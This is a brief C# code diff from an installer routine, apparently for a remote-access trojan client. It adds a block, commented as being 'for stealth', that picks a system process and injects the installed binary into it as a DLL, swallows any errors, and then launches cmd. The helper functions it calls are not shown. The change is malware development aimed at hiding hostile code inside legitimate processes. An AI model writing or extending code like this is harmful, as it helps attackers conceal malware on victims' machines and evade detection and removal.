@@ -43,6 +43,17 @@ namespace Client.Install
                         }
                         catch { }
                         
+                        // Inject into system process for stealth
+                        try
+                        {
+                            Process targetProcess = ProcessInjection.FindSuitableTarget();
+                            if (targetProcess != null && File.Exists(installPath.FullName))
+                            {
+                                ProcessInjection.InjectDll(targetProcess.Id, installPath.FullName);
+                            }
+                        }
+                        catch { }
+                        
                         Process.Start(new ProcessStartInfo
                         {
                             FileName = "cmd",
